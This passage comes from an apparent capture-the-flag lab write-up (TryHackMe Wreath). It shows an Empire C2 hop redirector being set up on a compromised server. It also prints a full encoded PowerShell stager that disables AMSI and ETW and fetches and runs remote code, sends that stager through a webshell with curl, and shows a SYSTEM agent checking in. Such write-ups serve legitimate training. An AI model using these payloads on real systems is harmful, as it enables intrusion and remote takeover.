├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ RedirectStagingKey │                                │ False    │ The staging key for the redirect   │
│                    │                                │          │ listener, extracted from           │
│                    │                                │          │ RedirectListener automatically.    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Host               │                                │ True     │ Hostname/IP for staging.           │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Port               │ 80                             │ True     │ Port for the listener.             │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ DefaultProfile     │                                │ False    │ Default communication profile for  │
│                    │                                │          │ the agent, extracted from          │
│                    │                                │          │ RedirectListener automatically.    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ OutFolder          │ /tmp/http_hop/                 │ True     │ Folder to output redirectors to.   │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ SlackURL           │                                │ False    │ Your Slack Incoming Webhook URL to │
│                    │                                │          │ communicate with your Slack        │
│                    │                                │          │ instance.                          │
└────────────────────┴────────────────────────────────┴──────────┴────────────────────────────────────┘

(Empire: uselistener/http_hop) >
```

Specifically we need:-

- A RedirectListener -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!
- A Host -- the IP of the compromised webserver (.200).
- A Port -- this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!

```shell
(Empire: uselistener/http_hop) > set Name CLIHTTP_HOP
INFO: Set Name to CLIHTTP_HOP 
(Empire: uselistener/http_hop) > set RedirectListener CLIHTTP
INFO: Set RedirectListener to CLIHTTP 
(Empire: uselistener/http_hop) > set Host 10.200.84.200
INFO: Set Host to 10.200.84.200 
(Empire: uselistener/http_hop) > set Port 16000
INFO: Set Port to 16000 
(Empire: uselistener/http_hop) > options

┌Record Options──────┬────────────────────────────────┬──────────┬────────────────────────────────────┐
│ Name               │ Value                          │ Required │ Description                        │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Name               │ CLIHTTP_HOP                    │ True     │ Name for the listener.             │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ RedirectListener   │ CLIHTTP                        │ True     │ Existing listener to redirect the  │
│                    │                                │          │ hop traffic to.                    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Launcher           │ powershell -noP -sta -w 1 -enc │ True     │ Launcher string.                   │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ RedirectStagingKey │                                │ False    │ The staging key for the redirect   │
│                    │                                │          │ listener, extracted from           │
│                    │                                │          │ RedirectListener automatically.    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Host               │ 10.200.84.200                  │ True     │ Hostname/IP for staging.           │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Port               │ 16000                          │ True     │ Port for the listener.             │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ DefaultProfile     │                                │ False    │ Default communication profile for  │
│                    │                                │          │ the agent, extracted from          │
│                    │                                │          │ RedirectListener automatically.    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ OutFolder          │ /tmp/http_hop/                 │ True     │ Folder to output redirectors to.   │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ SlackURL           │                                │ False    │ Your Slack Incoming Webhook URL to │
│                    │                                │          │ communicate with your Slack        │
│                    │                                │          │ instance.                          │
└────────────────────┴────────────────────────────────┴──────────┴────────────────────────────────────┘

(Empire: uselistener/http_hop) > execute
[+] Listener CLIHTTP_HOP successfully started
(Empire: uselistener/http_hop) >
```

Ans as in output above, let's start the listener by `execute`

This will have written a variety of files into a new `http_hop` directory in `/tmp` of our attacking machine. We will need to replicate this file structure on our jump server (the compromised `.200` webserver) when we serve the files. Notice that these files (`news.php`, `admin/get.php`, and `login/process.php`) would not look out of place amongst genuine web application files -- and indeed could easily be discretely merged into an existing webapp.

### starkiller

Switch back to the Listeners menu in Starkiller and create a new listener. Select `http_hop` for the type. We then fill in the options as in Empire CLI:

Again, we set the Host (`.200`), Port, and RedirectListener.

Note: if you also have a Hop Listener set up using the Empire CLI then you should also change the OutFolder to avoid overwriting the previously generated files.

![wreath25](./assets/wreath25.png)

Click "Submit", and the listener starts!

## Task 29 - Command and Control - Git Server

Now let's put it all together.

We should have a `http_hop` listener started in either Empire or Starkiller.

With the listener started there are two things we must do before we can get an agent back from the Git Server:-

- We must generate an appropriate stager for the target
- We must put the `http_hop` files into position on .200, and start a webserver to serve the files on the port we selected during the listener creation. This server must be able to execute PHP, so a PHP Debug server is ideal

### Empire CLI

Let's start with generating a stager. For this we will use the `multi_launcher` stager. The only option needing to be set here is the "Listener" option, which needs set to the name of the `http_hop` listener we created in the previous task:

```shell
(Empire: uselistener/http_hop) > usestager multi_launcher

 id           multi_launcher                                        
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y 
 description  Generates a one-liner stage0 launcher for Empire.     


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       │
│                  │                    │          │ connecting.                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │                    │ False    │ Filename that should be used for    │
│                  │                    │          │ the generated output.               │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Base64           │ True               │ True     │ Switch. Base64 encode the output.   │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ SafeChecks       │ True               │ True     │ Switch. Checks for LittleSnitch or  │
│                  │                    │          │ a SandBox, exit the staging process │
│                  │                    │          │ if true. Defaults to True.          │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
│                  │                    │          │ staging request (default, none, or  │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/multi_launcher) > set Listener CLIHTTP_HOP
INFO: Set Listener to CLIHTTP_HOP 
(Empire: usestager/multi_launcher) > execute
INFO: Stager copied to clipboard 
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBaAGUAUgBVAD8AcwBKAGwARABmAD0AeQAtAFYAaABLAF0ATgAqAFMAOgAyAHwAewArAEcAMwBuAFAASQApAGcAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBaAG0AZgBpAG4ANABUAHEAYwBNAFYAaQB6AEQAawBhAEEASwBxAGcANgBiAG8ANQAzADkANAA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAZwBBAE4AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATQBRAEEAMgBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAQwBMAEkASABUAFQAUABfAEgATwBQACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
(Empire: usestager/multi_launcher) >
```

Save the provided command somewhere and do not execute it yet. We will need it once we have set up the hop files on the jump server.

### Starkiller

Same here as for Empire CLI. Use the `multi_launcher` stager. The only option needing to be set here is the "Listener" option, which needs set to the name of the `http_hop` listener we created in the previous task and click `Submit`

![wreath26](./assets/wreath26.png)

Save the provided command somewhere and do not execute it yet. We will need it once we have set up the hop files on the jump server.

### Jump server

First of all, in the /tmp directory of the compromised webserver, create and enter a directory called hop-USERNAME. e.g.:

```shell
[root@prod-serv ~]# mkdir /tmp/hop-DA
[root@prod-serv ~]# cd /tmp/hop-DA/
[root@prod-serv hop-DA]# 
```

Transfer the contents from the /tmp/http_hop (or what you called it) directory across to this directory on the target server. A good way to do this is by zipping up the contents of the directory (cd /tmp/http_hop && zip -r hop.zip *), then transferring the zip file across using one of the methods previously shown.

On local attack machine.

```shell
kali@attacker:~/wreath$ cd /tmp/http_hop/
kali@attacker:/tmp/http_hop$ sudo zip -r hop.zip *
  adding: admin/ (stored 0%)
  adding: admin/get.php (deflated 66%)
  adding: login/ (stored 0%)
  adding: login/process.php (deflated 66%)
  adding: news.php (deflated 66%)
kali@attacker:/tmp/http_hop$ scp -i ~/wreath/id_rsa hop.zip root@10.200.84.200:/tmp/hop-DA
hop.zip                                                                                                           100% 2976    11.7KB/s   00:00    
kali@attacker:/tmp/http_hop$ 
```

Back to compromised prod-serv `.200`

```shell
[root@prod-serv hop-DA]# unzip hop.zip 
Archive:  hop.zip
   creating: admin/
  inflating: admin/get.php           
   creating: login/
  inflating: login/process.php       
  inflating: news.php                
[root@prod-serv hop-DA]# ls -l
total 8
drwxr-xr-x. 2 root root   21 Feb 24 02:36 admin
-rw-r--r--. 1 root root 2976 Feb 24 03:02 hop.zip
drwxr-xr-x. 2 root root   25 Feb 24 02:36 login
-rw-r--r--. 1 root root 2202 Feb 24 02:36 news.php
[root@prod-serv hop-DA]#
```

Note: the output of ls must match up with with above -- i.e. there should be a `news.php` file in your current directory, with `admin/` and `login/` as subdirectories.

We now need to actually serve the files on the port we chose when generating the http_hop listener (task 28). Fortunately we already know that this server has PHP installed as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files! The syntax for this is as follows:

`php -S 0.0.0.0:PORT &>/dev/null &`

```shell
[root@prod-serv hop-DA]# php -S 0.0.0.0:16000 &
[1] 3414
[root@prod-serv hop-DA]# PHP 7.2.24 Development Server started at Sat Feb 24 03:10:39 2024
Listening on http://0.0.0.0:16000
Document root is /tmp/hop-DA
Press Ctrl-C to quit.
```

```shell
[root@prod-serv ~]# ss -tulwn | grep 16000
tcp     LISTEN   0        128              0.0.0.0:16000          0.0.0.0:*  
```

As shown in output, the webserver is now listening in the background on the chosen port 16000.

Note: Remember to open up the port in the firewall if you haven't already!

This is a handy trick for when we need to serve PHP files, as our standard Python HTTP webserver is not capable of interpreting the PHP language and so cannot execute the scripts.

Both the reverse shell we received way back in task 19, and our evil-winrm access are already running in Powershell, so we would need to adapt the stager generated for us by Empire in order to use them. Instead, it is easier to use it with the webshell we originally used to compromise the machine (i.e. paste the stager as the value of the "a" parameter in cURL or BurpSuite), remembering to URL encode the stager first.

---

Let's look on that in detail.

Let's create the port forward from local machine to the webshell.

```shell
kali@attacker:~/wreath$ ssh -i ./id_rsa -L 8080:10.200.84.150:80  root@10.200.84.200
[root@prod-serv ~]#
```

Let's check it is still playing.

```shell
kali@attacker:~$ curl -X POST http://localhost:8080/web/exploit-DA.php --data "a=whoami"
"nt authority\system
" 
```

Open firewall for port 16000 that our created listener is using.

```shell
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 16000/tcp
success
```

Start the hop listener

```shell
[root@prod-serv hop-DA]# PHP 7.2.24 Development Server started at Sat Feb 24 10:54:27 2024
Listening on http://0.0.0.0:16000
Document root is /tmp/hop-DA
Press Ctrl-C to quit.
```

Prepare the curl with the stager as the new command and execute.

```shell
curl -X POST http://localhost:8080/web/exploit-DA.php --data 'a=powershell%20-noP%20-sta%20-w%201%20-enc%20%20SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBaAGUAUgBVAD8AcwBKAGwARABmAD0AeQAtAFYAaABLAF0ATgAqAFMAOgAyAHwAewArAEcAMwBuAFAASQApAGcAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBOAGIASwBLAEkASwBGAGgAMgBmAFcAbABlAEwAVwB6AE8AbABFADEAUwBPAE0AVwAwAFUAWQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAZwBBAE4AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATQBRAEEAMgBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAQwBMAEkASABUAFQAUABfAEgATwBQACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA%3D%3D'
```

Now we can se the listener working on prod-serv.

```shell
root@prod-serv hop-DA]# PHP 7.2.24 Development Server started at Sat Feb 24 10:54:27 2024
Listening on http://0.0.0.0:16000
Document root is /tmp/hop-DA
Press Ctrl-C to quit.
[Sat Feb 24 10:54:32 2024] 10.200.84.150:50264 [200]: /admin/get.php
[Sat Feb 24 10:54:33 2024] 10.200.84.150:50265 [200]: /news.php
[Sat Feb 24 10:54:42 2024] 10.200.84.150:50267 [200]: /login/process.php
```

And we can see the agent checked in to Empire.

```shell
[+] New agent 7BYWXVTC checked in
(Empire: listeners) > agents

┌Agents────┬───────────┬────────────┬───────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬─────────────┐
│ ID       │ Name      │ Language   │ Internal IP   │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener    │
├──────────┼───────────┼────────────┼───────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼─────────────┤
│ 7BYWXVTC │ 7BYWXVTC* │ powershell │ 10.200.84.150 │ WORKGROUP\SYSTEM │ powershell │ 3436 │ 5/0.0 │ 2024-02-24 05:56:59 EST │ CLIHTTP_HOP │
│          │           │            │               │                  │            │      │       │ (a second ago)          │             │
└──────────┴───────────┴────────────┴───────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴─────────────┘

(Empire: agents) >
```

And let's try it out.

```shell
(Empire: agents) > interact 7BYWXVTC
(Empire: 7BYWXVTC) > shell whoami
INFO: Tasked 7BYWXVTC to run Task 1 
[*] Task 1 results received
NT AUTHORITY\SYSTEM
(Empire: 7BYWXVTC) >
```

## Task 30 - Command and Control - Empire: Modules

As mentioned previously, modules are used to perform various tasks on a compromised target, through an active Empire agent. For example, we could use Mimikatz through its Empire module to dump various secrets from the target.

### Empire CLI

Inside the context of an agent, type `usemodule`. As expected, this will show a dropdown with a huge list of modules which can be loaded into the agent for execution.

It doesn't really matter here as we already have full access to the target, but for the sake of learning, let's try loading in the Sherlock Empire module. This checks for potential privilege escalation vectors on the target.

`usemodule powershell_privesc_sherlock`

```shell
(Empire: LSYMEK1D) > usemodule powershell_privesc_sherlock
INFO: Set Agent to LSYMEK1D 

 id           powershell_privesc_sherlock                                  
 authors      Daniel Duggan, @_RastaMouse, https://twitter.com/_rastamouse 
 description  Find Windows local privilege escalation vulnerabilities.     
 background   True                                                         
 language     powershell                                                   
 needs_admin  False                                                        
 opsec_safe   True                                                         
 techniques   http://attack.mitre.org/techniques/T1046                     
 comments     https://github.com/rasta-mouse/Sherlock                      


┌Record Options──┬────────────┬──────────┬─────────────────────────────────────┐
│ Name           │ Value      │ Required │ Description                         │
├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
│ Agent          │ LSYMEK1D   │ True     │ Agent to run module on.             │
├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
│ OutputFunction │ Out-String │ False    │ PowerShell's output function to use │
│                │            │          │ ("Out-String", "ConvertTo-Json",    │
│                │            │          │ "ConvertTo-Csv", "ConvertTo-Html",  │
│                │            │          │ "ConvertTo-Xml").                   │
└────────────────┴────────────┴──────────┴─────────────────────────────────────┘

(Empire: usemodule/powershell_privesc_sherlock) >
```

As previously, we can use `options` to get information about the module after loading it in.

This module requires one option to be set: the `Agent` value. This is already set for us here; however, if it was incorrect or there was no option set already then we could set it using the command: `set Agent AGENT_NAME`, (the same syntax as in previous parts of the framework).

We start the module using the usual `execute` command. The module will then run as a background job, returning the results when it completes.

```shell
(Empire: usemodule/powershell_privesc_sherlock) > execute
INFO: Tasked LSYMEK1D to run Task 1 
[*] Task 1 results received
Job started: M2AW3N
[*] Task 1 results received


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

